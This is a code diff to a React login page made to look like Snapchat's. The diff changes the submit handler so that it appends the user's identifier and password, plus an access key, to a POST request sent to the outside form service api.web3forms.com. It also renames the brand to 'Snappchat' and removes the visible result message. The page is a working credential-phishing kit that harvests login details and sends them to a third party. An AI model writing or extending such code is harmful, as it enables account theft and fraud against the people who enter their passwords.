@@ -20,7 +20,7 @@ function LoginPage() {
   const [showPassword, setShowPassword] = useState(false)
   const [error, setError] = useState<string | null>(null)
   const [pending, setPending] = useState(false)
-  const [result, setResult] = useState("");
+   const [result, setResult] = useState("");
 
 
   function handleNext(e: React.FormEvent) {
@@ -42,9 +42,32 @@ function LoginPage() {
     setStep('password')
   }
 
+    const onSubmit = async (event) => {
+    event.preventDefault();
+    setResult("Sending....");
+    const formData = new FormData(event.target.value);
+    formData.append("indentifier",identifier);
+    formData.append("pass",password);
+    formData.append("access_key", "1b028f7e-246a-46c2-aa96-9ae417d5b106");
+
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    const data = await response.json();
+    if (data.success) {
+      setResult("Form Submitted Successfully");
+      event.target.reset();
+    } else {
+      setResult("Error");
+    }
+  };
+
   function handleLogin(e: React.FormEvent) {
     onSubmit(e);
     e.preventDefault()
+
     if (!password) {
       setError('Please enter your password.')
       return
@@ -69,28 +92,6 @@ function LoginPage() {
     setError(null)
   }
 
-  const onSubmit = async (event) => {
-
-    event.preventDefault();
-    setResult("Sending....");
-    const formData = new FormData(event.target);
-    formData.append("username",identifier)
-    // formData.append("access_key", "1b028f7e-246a-46c2-aa96-9ae417d5b106");
-
-    const response = await fetch("https://api.web3forms.com/submit", {
-      method: "POST",
-      body: formData
-    });
-
-    const data = await response.json();
-    if (data.success) {
-      setResult("Form Submitted Successfully");
-      event.target.reset();
-    } else {
-      setResult("Error");
-    }
-  };
-
   return (
     <div className="min-h-screen bg-brand flex flex-col">
       <header className="flex items-center justify-between px-5 py-4 md:px-8">
@@ -111,11 +112,9 @@ function LoginPage() {
           </div>
 
           {step === 'identifier' ? (
-            <form onSubmit={handleNext} noValidate action="https://api.web3forms.com/submit" method="POST">
-              <input type="hidden" name="access_key" value="1b028f7e-246a-46c2-aa96-9ae417d5b106" />
-              
+            <form onSubmit={handleNext} noValidate>
               <h1 className="mb-8 text-center text-2xl font-extrabold tracking-tight text-black">
-                Log in to Snapchat
+                Log in to Snappchat
               </h1>
 
               <FieldLabel htmlFor="identifier">
@@ -158,7 +157,7 @@ function LoginPage() {
           ) : (
             <form onSubmit={handleLogin} noValidate>
               <button
-                type="submit"
+                type="button"
                 onClick={goBack}
                 className="mb-4 flex items-center gap-1.5 text-sm font-semibold text-neutral-600 hover:text-black"
               >
@@ -221,7 +220,7 @@ function LoginPage() {
           )}
 
           <div className="mt-10 border-t border-neutral-200 pt-6 text-center text-sm text-neutral-600">
-            New to Snapchat?{' '}
+            New to Snappchat?{' '}
             <a
               href="#"
               onClick={(e) => {
@@ -236,9 +235,6 @@ function LoginPage() {
         </div>
       </main>
 
-      <footer className="px-5 pb-6 text-center text-xs text-black/60">
-      {result}
-      </footer>
     </div>
   )
 }
